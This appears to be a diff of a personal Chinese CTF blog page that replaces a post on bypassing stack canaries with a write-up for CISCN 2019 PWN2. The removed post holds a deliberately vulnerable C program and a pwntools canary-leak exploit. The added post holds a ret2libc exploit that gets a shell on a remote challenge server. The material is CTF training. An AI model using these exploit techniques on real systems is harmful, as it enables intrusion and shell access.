@@ -9,7 +9,7 @@
     
     <title>
         
-            Canary保护机制及绕过 |
+            CISCN 2019东北-PWN2 |
         
         Jerem1ah&#39;s Blog
     </title>
@@ -162,7 +162,7 @@
         <div class="article-content-container">
 
             <div class="article-title">
-                <span class="title-hover-animation">Canary保护机制及绕过</span>
+                <span class="title-hover-animation">CISCN 2019东北-PWN2</span>
             </div>
 
             
@@ -184,8 +184,8 @@
         
             <i class="fa-regular fa-calendar-plus"></i>&nbsp;
         
-        <span class="pc">2024-08-05 20:47:10</span>
-        <span class="mobile">2024-08-05 20:47</span>
+        <span class="pc">2024-08-13 09:47:44</span>
+        <span class="mobile">2024-08-13 09:47</span>
     </span>
     
         <span class="article-update-date article-meta-item">
@@ -219,51 +219,13 @@
             
 
             <div class="article-content keep-markdown-body">
-                <h1 id="Canary保护机制及绕过"><a href="#Canary保护机制及绕过" class="headerlink" title="Canary保护机制及绕过"></a>Canary保护机制及绕过</h1><p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/m0_64815693/article/details/129188665?spm=1001.2014.3001.5502" >https://blog.csdn.net/m0_64815693/article/details/129188665?spm=1001.2014.3001.5502<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/346608.html" >https://www.freebuf.com/articles/system/346608.html<i class="fas fa-external-link-alt"></i></a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">void exploit()</span><br><span class="line">&#123;</span><br><span class="line">    system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line">void func()</span><br><span class="line">&#123;</span><br><span class="line">    char str[0x20];</span><br><span class="line">    read(0, str, 0x50);</span><br><span class="line">    printf(str);</span><br><span class="line">    read(0, str, 0x50);</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    func();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -z execstack -no-pie -z norelro -fstack-protector-all 03.c -o 3</span><br></pre></td></tr></table></figure>
-
-<ol>
-<li><p>相较于之前没开保护，现在增加了一些指令，如下，主要就是将一个随机数赋值给rax寄存器，然后再将rax寄存器的值压入栈中，之后进行一个xor操作，简而言之，就是在栈中加入了一个随机<img src="/../images/50%E9%87%91%E4%B8%9D%E9%9B%80%E7%BB%95%E8%BF%87/image-20240730095420945.png" alt="image-20240730095420945"></p>
-</li>
-<li><p>随机数存放的位置如图，在（rbp，rbp-8】的位置<img src="/../images/50%E9%87%91%E4%B8%9D%E9%9B%80%E7%BB%95%E8%BF%87/image-20240802133941258.png" alt="image-20240802133941258"></p>
-</li>
-<li><p>main函数的栈帧改变之前，【随机数，地址，下条指令地址，rbp值】<img src="/../images/50%E9%87%91%E4%B8%9D%E9%9B%80%E7%BB%95%E8%BF%87/image-20240802134843418.png" alt="image-20240802134843418"></p>
-</li>
-<li><pre><code class="py">from pwn import *
-context.log_level = &quot;debug&quot;
-context.terminal = [&#39;bash&#39;, &#39;-e&#39;, &#39;sh&#39;, &#39;-c&#39;]
-p = gdb.debug(&quot;/home/pwn/03eeepwn/test&quot;,&quot;break main&quot;)
+                <h1 id="CISCN-2019东北-PWN2"><a href="#CISCN-2019东北-PWN2" class="headerlink" title="[CISCN 2019东北]PWN2"></a>[CISCN 2019东北]PWN2</h1><p><a class="link"   target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/95" >https://www.nssctf.cn/problem/95<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment"># context.terminal = [&quot;bash&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = gdb.debug(&quot;/home/pwn/10ret2libc64_ciscn/ciscn_2019_pwn2&quot;,&quot;break main&quot;)</span></span><br><span class="line"><span class="comment"># p = process(&quot;/home/pwn/10ret2libc64_ciscn/ciscn_2019_pwn2&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.anna.nssctf.cn&quot;</span>,<span class="number">21739</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;/home/pwn/10ret2libc64_ciscn/ciscn_2019_pwn2&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">encrypt_addr = elf.sym[<span class="string">&quot;encrypt&quot;</span>]</span><br><span class="line">ret_addr = <span class="number">0x4006b9</span></span><br><span class="line">rdi_addr = <span class="number">0x400c83</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span> + p64(rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(encrypt_addr)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your choice!&quot;</span>.encode())</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>.encode())</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>.encode())</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;put_add -&gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line">libc_addr = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">bin_sh_addr = libc_addr + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">system_addr = libc_addr + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">&#x27;libc_add -&gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(libc_addr))</span><br><span class="line">success(<span class="string">&#x27;bin_sh_add -&gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(bin_sh_addr))</span><br><span class="line">success(<span class="string">&#x27;system_add -&gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(system_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span> + p64(ret_addr) + p64(rdi_addr) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your Plaintext to be encrypted\n&quot;</span>.encode())</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 
-a = input(&quot;a:&quot;)
-p.sendline(b&quot;%11$p&quot;)
 
-b = input(&quot;b:&quot;)
-cannary = p.recvline(keepends = False)
-cannary = p.recvline(keepends = False)
-
-cannary = int(cannary.decode().strip(), 16)
-print(cannary)
-
-c = input(&quot;c:&quot;)
-
-offset1 = 0x30 - 0x08
-offset2 = 0x08
-payload = b&#39;a&#39;*offset1 + p64(cannary) + b&#39;b&#39;*offset2 + p64(0x4011d8)+p64(0x401196)
-p.sendline(payload)
-p.interactive()
-</code></pre>
-</li>
-<li><p>不废话了，直接分析，主要就是通过格式化字符串拿到cannary的值，然后直接栈溢出就ok了，以下是拿到cannary的值之后在栈中注入恶意字符的栈帧<img src="/../images/50%E9%87%91%E4%B8%9D%E9%9B%80%E7%BB%95%E8%BF%87/image-20240802222132245.png" alt="image-20240802222132245"></p>
-</li>
-<li><p><img src="/../images/50%E9%87%91%E4%B8%9D%E9%9B%80%E7%BB%95%E8%BF%87/image-20240802222218970.png" alt="image-20240802222218970"></p>
-</li>
-<li><p>获得权限<img src="/../images/50%E9%87%91%E4%B8%9D%E9%9B%80%E7%BB%95%E8%BF%87/image-20240802222414964.png" alt="image-20240802222414964"></p>
-</li>
-</ol>
+<p><img src="/../images/54%E6%A0%88%E6%BA%A2%E5%87%BAret2libc/image-20240813093657182.png" alt="image-20240813093657182"></p>
+<p>以上脚本远程可以通，本地却走不通。应该就是我本地的libc版本的问题，也懒得调了，学完libc就跑。不再看pwn了。</p>
 
             </div>
 
@@ -282,29 +244,14 @@ p.interactive()
             
                 <div class="article-nav">
                     
-                        <div class="article-prev">
-                            <a class="prev"
-                               rel="prev"
-                               href="/2024/08/05/51%E6%A0%88%E6%BA%A2%E5%87%BAret2text/"
-                            >
-                            <span class="left arrow-icon flex-center">
-                              <i class="fas fa-chevron-left"></i>
-                            </span>
-                                <span class="title flex-center">
-                                <span class="post-nav-title-item">ret2text</span>
-                                <span class="post-nav-item">Prev posts</span>
-                            </span>
-                            </a>
-                        </div>
-                    
                     
                         <div class="article-next">
                             <a class="next"
                                rel="next"
-                               href="/2024/08/05/49%E6%A0%88%E6%BA%A2%E5%87%BA/"
+                               href="/2024/08/13/53%E6%A0%88%E6%BA%A2%E5%87%BAret2syscall/"
                             >
                             <span class="title flex-center">
-                                <span class="post-nav-title-item">栈溢出分析</span>
+                                <span class="post-nav-title-item">ret2syscall</span>
                                 <span class="post-nav-item">Next posts</span>
                             </span>
                                 <span class="right arrow-icon flex-center">
@@ -381,7 +328,7 @@ p.interactive()
             <div class="toc-content-container">
                 <div class="post-toc-wrap">
     <div class="post-toc">
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Canary%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E5%8F%8A%E7%BB%95%E8%BF%87"><span class="nav-text">Canary保护机制及绕过</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CISCN-2019%E4%B8%9C%E5%8C%97-PWN2"><span class="nav-text">[CISCN 2019东北]PWN2</span></a></li></ol>
     </div>
 </div>
 
